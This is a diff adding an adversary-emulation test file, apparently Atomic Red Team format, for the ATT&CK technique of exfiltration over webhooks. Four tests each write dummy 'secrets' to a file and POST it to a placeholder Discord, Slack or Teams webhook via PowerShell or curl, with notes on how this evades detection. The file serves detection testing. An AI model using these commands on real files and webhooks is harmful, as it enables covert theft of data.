@@ -1,0 +1,115 @@
+attack_technique: T1567.004
+display_name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+atomic_tests:
+- name: Exfiltrate staged data to a Discord webhook (PowerShell)
+  auto_generated_guid: f0057c81-24dc-4a2e-b658-5809c242180b
+  description: |
+    Stages a file containing simulated sensitive data and exfiltrates its contents to a
+    Discord incoming webhook by POSTing a JSON `content` payload over HTTPS. Webhook URLs
+    require no authentication header, so a single HTTPS POST is sufficient to move data out
+    of the environment while blending in with normal SaaS traffic.
+    See https://discord.com/developers/docs/resources/webhook#execute-webhook
+  supported_platforms:
+  - windows
+  input_arguments:
+    webhook_url:
+      description: Discord incoming webhook URL the staged data is exfiltrated to
+      type: string
+      default: https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken
+    staged_file:
+      description: Path to the file that is staged and exfiltrated
+      type: path
+      default: $env:TEMP\T1567.004_loot.txt
+  executor:
+    command: |
+      "secrets, api keys, passwords - T1567.004 atomic test" | Out-File -FilePath "#{staged_file}" -Encoding ascii
+      $body = @{ content = (Get-Content -Raw "#{staged_file}") } | ConvertTo-Json
+      Invoke-RestMethod -Uri "#{webhook_url}" -Method Post -ContentType 'application/json' -Body $body
+    cleanup_command: |
+      Remove-Item -Path "#{staged_file}" -ErrorAction Ignore
+    name: powershell
+    elevation_required: false
+- name: Exfiltrate staged file to a Discord webhook with curl (bash)
+  auto_generated_guid: 40c44d16-bb49-4d14-aafa-f9ba7e6e6c5b
+  description: |
+    Stages a file containing simulated sensitive data and uploads it as a multipart
+    `file` attachment to a Discord incoming webhook using curl. This produces an outbound
+    HTTPS POST to a commonly allow-listed SaaS endpoint, mirroring real-world data theft
+    that abuses Discord webhooks for exfiltration.
+    See https://discord.com/developers/docs/resources/webhook#execute-webhook
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    webhook_url:
+      description: Discord incoming webhook URL the staged data is exfiltrated to
+      type: string
+      default: https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken
+    staged_file:
+      description: Path to the file that is staged and exfiltrated
+      type: path
+      default: /tmp/T1567.004_loot.txt
+  executor:
+    command: |
+      echo "secrets, api keys, passwords - T1567.004 atomic test" > "#{staged_file}"
+      curl -s -F "file=@#{staged_file}" "#{webhook_url}"
+    cleanup_command: |
+      rm -f "#{staged_file}"
+    name: bash
+    elevation_required: false
+- name: Exfiltrate staged data to a Slack webhook with curl (sh)
+  auto_generated_guid: c666acd6-6ff5-4d28-9490-195d89cd4337
+  description: |
+    Stages a file containing simulated sensitive data and exfiltrates its contents to a
+    Slack incoming webhook by POSTing a JSON `text` payload with curl. Slack incoming
+    webhooks accept unauthenticated JSON POSTs, making them a low-friction exfiltration
+    channel that blends with legitimate collaboration traffic.
+    See https://api.slack.com/messaging/webhooks
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    webhook_url:
+      description: Slack incoming webhook URL the staged data is exfiltrated to
+      type: string
+      default: https://hooks.slack.com/services/T00000000/B00000000/ReplaceWithYourWebhookToken
+    staged_file:
+      description: Path to the file that is staged and exfiltrated
+      type: path
+      default: /tmp/T1567.004_loot.txt
+  executor:
+    command: |
+      echo "secrets, api keys, passwords - T1567.004 atomic test" > "#{staged_file}"
+      curl -s -X POST -H 'Content-type: application/json' --data "{\"text\":\"$(cat #{staged_file})\"}" "#{webhook_url}"
+    cleanup_command: |
+      rm -f "#{staged_file}"
+    name: sh
+    elevation_required: false
+- name: Exfiltrate staged data to a Microsoft Teams webhook (PowerShell)
+  auto_generated_guid: 35ad6590-2207-4b14-bf8f-9899470d7156
+  description: |
+    Stages a file containing simulated sensitive data and exfiltrates its contents to a
+    Microsoft Teams incoming webhook (Office 365 connector / Power Automate workflow URL)
+    by POSTing a JSON `text` payload over HTTPS. The endpoint resides on a Microsoft-owned
+    domain, allowing the exfiltration to blend in with trusted corporate traffic.
+    See https://learn.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/add-incoming-webhook
+  supported_platforms:
+  - windows
+  input_arguments:
+    webhook_url:
+      description: Microsoft Teams incoming webhook URL the staged data is exfiltrated to
+      type: string
+      default: https://example.webhook.office.com/webhookb2/00000000-0000-0000-0000-000000000000@00000000-0000-0000-0000-000000000000/IncomingWebhook/ReplaceWithYourWebhookToken
+    staged_file:
+      description: Path to the file that is staged and exfiltrated
+      type: path
+      default: $env:TEMP\T1567.004_loot.txt
+  executor:
+    command: |
+      "secrets, api keys, passwords - T1567.004 atomic test" | Out-File -FilePath "#{staged_file}" -Encoding ascii
+      $body = @{ text = (Get-Content -Raw "#{staged_file}") } | ConvertTo-Json
+      Invoke-RestMethod -Uri "#{webhook_url}" -Method Post -ContentType 'application/json' -Body $body
+    cleanup_command: |
+      Remove-Item -Path "#{staged_file}" -ErrorAction Ignore
+    name: powershell
+    elevation_required: false
